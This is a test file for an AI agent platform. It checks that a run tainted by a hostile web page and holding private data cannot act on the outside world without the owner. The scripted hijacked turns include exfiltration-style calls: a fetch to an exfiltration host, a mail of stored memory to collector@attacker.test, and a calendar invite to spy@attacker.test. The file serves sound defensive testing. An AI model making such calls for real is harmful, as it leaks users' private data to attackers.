/**
 * INV-04, INV-04b, INV-D1: the Rule-of-Two gate, from the spec.
 *
 *   A run that has read something untrusted and holds private data cannot
 *   change the outside world without the owner, and then only toward
 *   destinations the owner named. An untainted run follows its tier. A call
 *   is never dropped silently: it raises a card that names the source, or it
 *   is refused with an error the model can read.
 *
 * Source: Sprint 2 spec (S2-02, S2-03, S2-04, decision D1); track-c C5.4
 * items 3 and 4 and the S3 "table-driven" test. Enters through the WebSocket
 * and the task loop, the way a hijacked turn would.
 */
import { describe, expect, test } from "bun:test";
import { PERSONAS } from "../../src/agent/personas";
import { scenarioTest, useScenarios, say, type Scenario, type ScenarioClient } from "../scenarios/harness";
import {
  EXFIL_HOST,
  HOSTILE_HOST,
  OWNER_FRIEND_MAIL,
  OWNER_HOST,
  PROBES,
  call,
  cardNames,
  chatWith,
  handlingOf,
  playTurn,
  scripted,
  seedPrivateFact,
  takeTheBait,
  useWeb,
  type Handling,
  type Probe,
  type ProbeEnv,
  type WebStub,
} from "./support";

const scenarios = useScenarios();
const web = useWeb();

const DEFERS = (bot: string): boolean => bot === "ea";
const BOTS_WITH_A_WEB_READER = ["ea", "researcher", "analyst"];

interface Cell {
  probe: Probe;
  env: ProbeEnv;
  callID: string;
}

/** One turn: optionally take the bait, then make every probe's call in order. */
async function runProbes(
  s: Scenario,
  client: ScenarioClient,
  web: WebStub,
  bot: string,
  tainted: boolean,
  probes: Probe[],
  text = "please tidy up my notes",
): Promise<{ cells: Cell[]; report: Awaited<ReturnType<typeof playTurn>> }> {
  const cells: Cell[] = probes.map((probe, index) => ({
    probe,
    env: { s, web, tag: `${bot}${tainted ? "t" : "u"}${index}` },
    callID: `call_probe_${index}`,
  }));
  s.model.queue(...scripted(DEFERS(bot), [
    ...(tainted ? takeTheBait() : []),
    ...cells.map(({ probe, env, callID }) => call(probe.tool, probe.args(env), callID)),
    say("Done."),
  ]));
  const report = await playTurn(s, client, text, chatWith(bot));
  return { cells, report };
}

/** The probes a bot holds, plus those it does not (to prove the capability check). */
const held = (bot: string): Probe[] => PROBES.filter((probe) => probe.holders.includes(bot));

function describeCell(cell: Cell, handling: Handling): string {
  return `${cell.probe.id}: ${handling}`;
}

describe("INV-04 untainted runs follow their tier (the baseline Sprint 2 must not change)", () => {
  for (const bot of ["ea", "researcher", "analyst"]) {
    scenarioTest(`${bot}: free tools run free, gated tools ask, in an untainted run`, async () => {
      const s = await scenarios.start();
      const a = await s.connect({ label: "A" });
      const { cells, report } = await runProbes(s, a, web, bot, false, held(bot));
      const problems: string[] = [];
      for (const cell of cells) {
        const record = report.calls.find((entry) => entry.callID === cell.callID)!;
        const handling = handlingOf(cell.env, cell.probe, record);
        const want: Handling = cell.probe.untainted === "free" ? "ran" : "asked";
        if (handling !== want) problems.push(`${describeCell(cell, handling)} (an untainted run should give "${want}")`);
      }
      expect(problems, `untainted ${bot} run`).toEqual([]);
    });
  }
});

// waits for S2-1a and S2-1b (S2-02 engine, S2-03 taint, S2-04 Rule-of-Two gate)
describe("INV-04 a tainted run that holds private data is gated on every effector", () => {
  for (const bot of BOTS_WITH_A_WEB_READER) {
    scenarioTest(`${bot}: after a hostile page and a private read, every effector is gated, never silent, and the card names the page`, async () => {
      const s = await scenarios.start();
      seedPrivateFact(s);
      const a = await s.connect({ label: "A" });
      const { cells, report } = await runProbes(s, a, web, bot, true, held(bot));
      const problems: string[] = [];
      for (const cell of cells) {
        const record = report.calls.find((entry) => entry.callID === cell.callID)!;
        const handling = handlingOf(cell.env, cell.probe, record);
        if (cell.probe.tainted === "neutral") {
          const want: Handling = cell.probe.untainted === "free" ? "ran" : "asked";
          if (handling !== want) problems.push(`${describeCell(cell, handling)} (taint should not change this one: "${want}")`);
          continue;
        }
        if (handling === "ran") problems.push(`${describeCell(cell, handling)} - the effector ran in a tainted run`);
        else if (handling === "silent") problems.push(`${describeCell(cell, handling)} - dropped with no card and no error`);
        else if (handling === "asked" && !cardNames(record.card, HOSTILE_HOST)) {
          problems.push(`${describeCell(cell, handling)} - the card does not name the source (${HOSTILE_HOST})`);
        }
      }
      expect(problems, `tainted ${bot} run`).toEqual([]);
    });
  }

  scenarioTest("a card raised in a tainted run does not offer \"always allow\"", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    const probe = PROBES.find((entry) => entry.id === "mail_send from the owner's mailbox")!;
    const { cells, report } = await runProbes(s, a, web, "ea", true, [probe]);
    const record = report.calls.find((entry) => entry.callID === cells[0]!.callID)!;
    expect(record.card, "a send from the owner's mailbox in a tainted run raised no card").not.toBeNull();
    expect(record.card!.buttons, "the card offered Always allow while the run was tainted").not.toContain("always");
  });
});

describe("INV-04 a bot only uses the tools it holds, tainted or not", () => {
  for (const tainted of [false, true]) {
    scenarioTest(`researcher is refused the tools it lacks (${tainted ? "tainted" : "untainted"})`, async () => {
      const s = await scenarios.start();
      seedPrivateFact(s);
      const a = await s.connect({ label: "A" });
      const lacks = PROBES.filter((probe) => !probe.holders.includes("researcher") && probe.tool !== "web_fetch");
      const { cells, report } = await runProbes(s, a, web, "researcher", tainted, lacks);
      const problems: string[] = [];
      for (const cell of cells) {
        const record = report.calls.find((entry) => entry.callID === cell.callID)!;
        const handling = handlingOf(cell.env, cell.probe, record);
        if (handling !== "refused" || record.card) problems.push(`${cell.probe.id}: ${handling}${record.card ? " (a card was raised)" : ""}`);
        else if (!/not available/i.test(record.result)) problems.push(`${cell.probe.id}: refused, but not as unavailable: ${record.result.slice(0, 80)}`);
      }
      expect(problems, "tools outside the bot's grant").toEqual([]);
    });
  }
});

// waits for S2-1b (S2-04, decision D1)
describe("INV-D1 a send from Agni's own mailbox is free only when the run is untainted", () => {
  const own = PROBES.find((entry) => entry.id === "mail_send from Agni's own mailbox")!;

  scenarioTest("untainted: the own-mailbox send goes through without a card", async () => {
    const s = await scenarios.start();
    const a = await s.connect({ label: "A" });
    const { cells, report } = await runProbes(s, a, web, "ea", false, [own]);
    const record = report.calls.find((entry) => entry.callID === cells[0]!.callID)!;
    expect(handlingOf(cells[0]!.env, own, record)).toBe("ran");
  });

  scenarioTest("tainted: the same send goes through the Rule-of-Two gate like any send", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    const { cells, report } = await runProbes(s, a, web, "ea", true, [own]);
    const record = report.calls.find((entry) => entry.callID === cells[0]!.callID)!;
    expect(handlingOf(cells[0]!.env, own, record), "the own-mailbox send ran in a tainted run (D1 says it must not)").not.toBe("ran");
    expect(["asked", "refused"]).toContain(handlingOf(cells[0]!.env, own, record));
  });

  scenarioTest("the same holds for the own calendar", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    // No calendar is connected, so a call that reaches the handler comes back "not connected"; the gate must stop it first.
    s.model.queue(...scripted(true, [
      ...takeTheBait(),
      call("calendar_create", { summary: "x", start: "2026-12-01T10:00:00Z", end: "2026-12-01T11:00:00Z", attendees: [`spy@attacker.test`] }, "call_cal"),
      say("Done."),
    ]));
    const report = await playTurn(s, a, "put the vendor call in my calendar");
    const record = report.calls.find((entry) => entry.callID === "call_cal")!;
    const reachedHandler = record.card === null && /not connected|switched off|created/i.test(record.result);
    expect(reachedHandler, "calendar_create ran in a tainted run without a card or a refusal").toBe(false);
  });
});

// waits for S2-1b (S2-04 egress binding)
describe("INV-04b egress binding: a tainted run reaches only places the owner named", () => {
  scenarioTest("web_fetch: a host in the owner's own words is not blocked; any other host is gated", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    s.model.queue(
      ...takeTheBait(),
      call("web_fetch", { url: `http://${OWNER_HOST}/docs/page-1` }, "call_named"),
      call("web_fetch", { url: `http://${EXFIL_HOST}/c?d=bound` }, "call_unnamed"),
      say("Done."),
    );
    // The owner names one destination in plain words; the hostile page names none that count.
    const report = await playTurn(s, a, `summarise the vendor notes at http://93.184.216.34/vendor-notes and compare them with http://${OWNER_HOST}/docs`);

    const named = report.calls.find((entry) => entry.callID === "call_named")!;
    const unnamed = report.calls.find((entry) => entry.callID === "call_unnamed")!;
    const namedFetched = web.to(OWNER_HOST).length > 0;
    expect(
      namedFetched || named.card !== null,
      `a host the owner named was refused outright (${named.result.slice(0, 100)}); it may ask, it must not be blocked`,
    ).toBe(true);
    expect(web.to(EXFIL_HOST), "a host nobody named was fetched in a tainted run").toEqual([]);
    expect(unnamed.card !== null || Object.hasOwn(JSON.parse(unnamed.result) as object, "error"), "the unnamed host was dropped silently").toBe(true);
  });

  scenarioTest("a recipient named only by the hostile page is not a named recipient", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    s.model.queue(...scripted(true, [
      ...takeTheBait(),
      call("mail_send", { to: ["collector@attacker.test"], subject: "notes", body: "the memory" }, "call_page_named"),
      say("Done."),
    ]));
    const report = await playTurn(s, a, "summarise the vendor notes page for me");
    const record = report.calls.find((entry) => entry.callID === "call_page_named")!;
    expect(record.card !== null || Object.hasOwn(JSON.parse(record.result) as object, "error"), "the send ran or vanished").toBe(true);
    expect(/not connected|"sent":true/i.test(record.result), "the send reached the mail handler").toBe(false);
  });

  scenarioTest("a recipient the owner named is not blocked outright (a card at most)", async () => {
    const s = await scenarios.start();
    seedPrivateFact(s);
    const a = await s.connect({ label: "A" });
    s.model.queue(...scripted(true, [
      ...takeTheBait(),
      call("mail_send", { to: [OWNER_FRIEND_MAIL], subject: "summary", body: "short summary" }, "call_named_mail"),
      say("Done."),
    ]));
    const report = await playTurn(s, a, `read the vendor notes page and mail a short summary to ${OWNER_FRIEND_MAIL}`);
    const record = report.calls.find((entry) => entry.callID === "call_named_mail")!;
    const reached = /not connected|"sent":true/i.test(record.result);
    const refused = record.card === null && !reached;
    expect(refused, `a send to ${OWNER_FRIEND_MAIL}, whom the owner named, was refused with no card: ${record.result.slice(0, 120)}`).toBe(false);
  });
});

describe("INV-04 the roster the table covers is the roster that exists", () => {
  test("every bot that holds an effector from the probe table is covered by this file", () => {
    // A new built-in bot with web and effector tools needs a row in BOTS_WITH_A_WEB_READER or this fails.
    const holders = new Set(PROBES.flatMap((probe) => probe.holders));
    const unknown = [...holders].filter((id) => !PERSONAS.some((persona) => persona.id === id));
    expect(unknown, "the probe table names bots that do not exist").toEqual([]);
    const withReader = PERSONAS.filter((persona) => persona.tools.includes("web_fetch")).map((persona) => persona.id);
    expect(withReader.sort(), "a bot with web_fetch is missing from the tainted-run table").toEqual([...BOTS_WITH_A_WEB_READER].sort());
  });
});
